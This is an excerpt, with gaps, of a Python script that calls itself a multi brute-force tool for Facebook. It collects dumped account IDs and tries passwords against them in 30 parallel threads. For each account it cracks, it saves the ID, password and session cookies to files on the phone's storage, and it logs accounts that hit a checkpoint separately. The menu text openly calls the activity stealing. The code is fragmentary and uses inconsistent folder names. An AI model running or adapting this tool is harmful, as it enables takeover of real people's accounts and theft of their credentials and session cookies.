...
def login_lagi334():
	try:
		...
		print(f'  %s[%sx%s]%s LOGIN FAILED.....CHECK YOUR TUMBAL !!%s'%(x,k,x,m,x))
		exit()
def bot():
	try:
...
def menu(my_name,my_id):
	...
	print(f'>> Your Ip  : {ip}')
	print(f'>> Github   : {gh}')
	print(f'>> watsapp : 083109115523')
    print()
	print('1. Mulai Maling ')
	#print('🥀→2. Crack Follower ')
	print('2. Crack Grup   ')
	print('3. Maling from File	')
	print('4. lihat hasil maling  ')
    print('0. exit tools      ')
...
def result():
	...
	if kz in ['2']:
		...
		try:vin = os.listdir('OK')
			...
			back()
		if len(vin)==0:
			print('>> You Do Not Have OK Files😥 ')
			time.sleep(2)
			back()
		else:
			cih = 0
...
def dump_massal():
	...
	try:
		print('')
		print(f'>> Total Ids Collected🔥{h}'+str(len(id)))
		setting()
	except requests.exceptions.ConnectionError:
		print(f'{x}')
...
#-------------[ CRACK-FROM-FILE ]------------------#
def crack_file():
	try:vin = os.listdir('/sdcard/FAZRY-DUMP')
	except FileNotFoundError:
		print('>> File Not Found ')
		time.sleep(2)
		back()
	if len(vin)==0:
		print('')
		cetak(nel('[white][[cyan]•[white]] If you want to use this feature, follow the conditions below\n[[green]1[white]] Create a File Dump Id First\n[[green]2[white]] After So Enter the File Into the Folder[yellow] FAZRY-DUMP[white] in Your Internal Storage\n[[green]3[white]] Then Rerun the Script! Just Choose Number Feature[yellow] 4 [white]ini '))
		kontol = input('\n>> Do You Understand? ( Y/t ) ')
		if kontol in ['']:
			print('>> Pilih Yang Bener babi ')
		elif kontol in ['y','Y']:
			print(f'\n[{h}√{x}] wow you are so smart ')
			time.sleep(3)
			back()
		elif kontol in ['t','T']:
		...
		lol = {}
		for isi in vin:
			try:hem = open('/sdcard/FAZRY-DUMP/'+isi,'r').readlines()
			except:continue
			cih+=1
			if cih<100:
				nom = ''+str(cih)
		...
		try:geh = lol[geeh]
			...
			time.sleep(3)
			back()
		try:lin = open('/sdcard/FAZRY-DUMP/'+geh,'r').read().splitlines()
		except:
	...
	with tred(max_workers=30) as pool:
		for yuzong in id2:
			...
			if 'mobile' in method:
				...
				pool.submit(crackmbasic,idf,pwv)
	print('')
	cetak(nel('\t[cyan]✓[green] Maling Done Don t Forget to Be Grateful [cyan] ✓[white] '))
	print(f'[{b}•{x}]{h} OK : {h}%s '%(ok))
	print(f'{x}[{b}•{x}]{k} CP : {k}%s{x} '%(cp))
	print('')
	print('>> Continue maling Back ( Y/t ) ? ')
	woi = input('===> Pilih : ')
	if woi in ['y','Y']:
		back()
	else:
		...
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				if 'ya' in oprek:
					...
					cetak(nel(statuscp1, title='FAZRY-S CP'))
				...
				if 'no' in taplikasi:
					coki=po.cookies.get_dict()
					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
					open('/sdcard/FAZRY-DATA/OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
					print('\n')
					statusok = f'[•] ID       : {idf}\n[•] PASSWORD : {pw}\n[•] COOKIES  : {kuki}'
					statusok1 = nel(statusok, style='green')
					cetak(nel(statusok1, title='FAZRY-S OK'))
					ok+=1
					break
				elif 'ya' in taplikasi:
					coki=po.cookies.get_dict()
		...
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				if 'ya' in oprek:
					...
					statuscp1 = nel(statuscp, style='red')
					cetak(nel(statuscp1, title='FAZRY-S CP'))
					open('/sdcard/FMBF-DATA/CP/'+cpc,'a').write(idf+'|'+pw+'\n')
					akun.append(idf+'|'+pw)
					cp+=1
				else:continue
				break
				...
				if 'no' in taplikasi:
					coki=po.cookies.get_dict()
					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
					open('/sdcard/FMBF-DATA/OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
					print('\n')
					statusok = f'[•] ID       : {idf}\n[•] PASSWORD : {pw}\n[•] COOKIES  : {kuki}'
					statusok1 = nel(statusok, style='green')
...
if __name__=='__main__':
	...
	try:os.mkdir('/sdcard/PAZRY-DUMP')
	except:pass
	...
	alvino_xy(f'\n\t{x}——> {h}WELCOME TO SCRIPT MULTI BRUTE FORCE FOR FACEBOOK!!!\n\t{x}')
	time.sleep(3)
	login()
